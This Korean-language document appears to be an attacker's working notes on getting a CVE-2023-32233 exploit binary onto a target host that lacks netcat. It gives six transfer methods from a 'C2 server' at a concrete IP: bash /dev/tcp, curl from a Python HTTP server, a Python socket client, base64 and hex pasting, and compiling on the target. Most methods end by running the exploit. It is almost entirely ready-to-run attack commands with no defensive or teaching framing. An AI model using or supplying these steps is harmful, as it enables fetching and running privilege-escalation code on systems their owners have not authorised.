# nc 없을 때 파일 전송 방법

## 문제
타겟에 nc (netcat)가 설치되지 않음

---

## 해결 방법 1: bash /dev/tcp (가장 빠름)

### C2 서버:

```bash
cd /tmp/CVE-2023-32233
nc -lvnp 5001 < exploit
```

### 타겟:

```bash
cd /tmp
cat < /dev/tcp/13.158.67.78/5001 > exploit
chmod +x exploit
ls -la exploit
file exploit
./exploit
```

---

## 해결 방법 2: curl 사용

### C2 서버:

```bash
cd /tmp
python3 -m http.server 5000 --bind 0.0.0.0
```

**AWS 보안그룹에서 5000 포트 인바운드 추가 필요**

### 타겟:

```bash
cd /tmp
curl -O http://13.158.67.78:5000/CVE-2023-32233/exploit
chmod +x exploit
./exploit
```

---

## 해결 방법 3: Base64 전송 (nc 필요 없음)

### C2 서버:

```bash
cd /tmp/CVE-2023-32233
base64 exploit | tr -d '\n' > exploit.b64
cat exploit.b64
```

**출력된 base64 문자열을 복사 (Ctrl+C)**

### 타겟:

```bash
cd /tmp
echo "[복사한 base64 문자열]" | base64 -d > exploit
chmod +x exploit
./exploit
```

**주의:** base64 문자열이 매우 길 수 있으므로 나눠서 전송:

```bash
cd /tmp
cat > exploit.b64 << 'EOF'
[여기에 base64 첫 부분]
[base64 중간 부분]
[base64 마지막 부분]
EOF

base64 -d exploit.b64 > exploit
chmod +x exploit
```

---

## 해결 방법 4: Python socket

### C2 서버:

```bash
cd /tmp/CVE-2023-32233

python3 << 'PYEOF'
import socket
import os

HOST = '0.0.0.0'
PORT = 5001

with open('exploit', 'rb') as f:
    data = f.read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

print(f'[*] Listening on {HOST}:{PORT}')
conn, addr = s.accept()
print(f'[+] Connection from {addr}')

conn.sendall(data)
conn.close()
print('[+] File sent!')
PYEOF
```

### 타겟:

```bash
cd /tmp

python3 << 'PYEOF'
import socket

HOST = '13.158.67.78'
PORT = 5001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

data = b''
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

s.close()

with open('exploit', 'wb') as f:
    f.write(data)

print('[+] File received!')
PYEOF

chmod +x exploit
./exploit
```

---

## 해결 방법 5: xxd hex 전송 (매우 작은 파일용)

### C2 서버:

```bash
cd /tmp/CVE-2023-32233
xxd -p exploit | tr -d '\n'
```

### 타겟:

```bash
cd /tmp
echo "[hex 문자열]" | xxd -r -p > exploit
chmod +x exploit
```

---

## 해결 방법 6: 타겟에서 직접 컴파일

타겟에 gcc가 있는지 확인:

```bash
which gcc
gcc --version
```

**있으면:**

### C2 서버에서 exploit.c를 복사:

```bash
cd /tmp/CVE-2023-32233
cat exploit.c
```

### 타겟에서 파일 생성 및 컴파일:

exploit.c가 너무 크면 curl/wget으로:

```bash
cd /tmp
curl http://13.158.67.78:5000/CVE-2023-32233/exploit.c -o exploit.c
gcc -o exploit exploit.c -lmnl -lnftnl -lpthread
./exploit
```

**gcc 없거나 라이브러리 없으면 안됨**

---

## 🚀 지금 바로 실행 (추천 순서)

### 1순위: bash /dev/tcp

**C2 서버:**
```bash
cd /tmp/CVE-2023-32233
nc -lvnp 5001 < exploit
```

**타겟:**
```bash
cd /tmp
cat < /dev/tcp/13.158.67.78/5001 > exploit
chmod +x exploit
./exploit
```

---

### 2순위: Python socket (타겟에 python3 있으면)

**타겟에서 python3 확인:**
```bash
which python3
python3 --version
```

**있으면 위의 "해결 방법 4" 사용**

---

### 3순위: curl + HTTP 서버

**C2 서버:**
```bash
cd /tmp
python3 -m http.server 5000 --bind 0.0.0.0 &
```

**AWS 보안그룹 5000 포트 열기**

**타겟:**
```bash
curl -O http://13.158.67.78:5000/CVE-2023-32233/exploit
chmod +x exploit
./exploit
```

---

### 4순위: Base64 (작은 파일, 복사 가능)

**C2 서버:**
```bash
cd /tmp/CVE-2023-32233
base64 exploit
```

**타겟:**
```bash
cd /tmp
cat > exploit.b64 << 'B64'
[base64 출력 붙여넣기]
B64
base64 -d exploit.b64 > exploit
chmod +x exploit
```

---

## 타겟 도구 확인

```bash
# 사용 가능한 도구 확인
which nc
which ncat
which netcat
which curl
which wget
which python3
which python
which perl
which gcc

# bash 버전 (최신이면 /dev/tcp 지원)
bash --version
echo "test" > /dev/tcp/13.158.67.78/4444
```

---

## 확실한 방법: /dev/tcp

bash가 있으면 거의 항상 작동:

**C2:**
```bash
cd /tmp/CVE-2023-32233
nc -lvnp 5001 < exploit
```

**타겟:**
```bash
cd /tmp
cat < /dev/tcp/13.158.67.78/5001 > exploit
chmod +x exploit
ls -la exploit
file exploit
./exploit
```

**이 방법이 가장 확실합니다!**
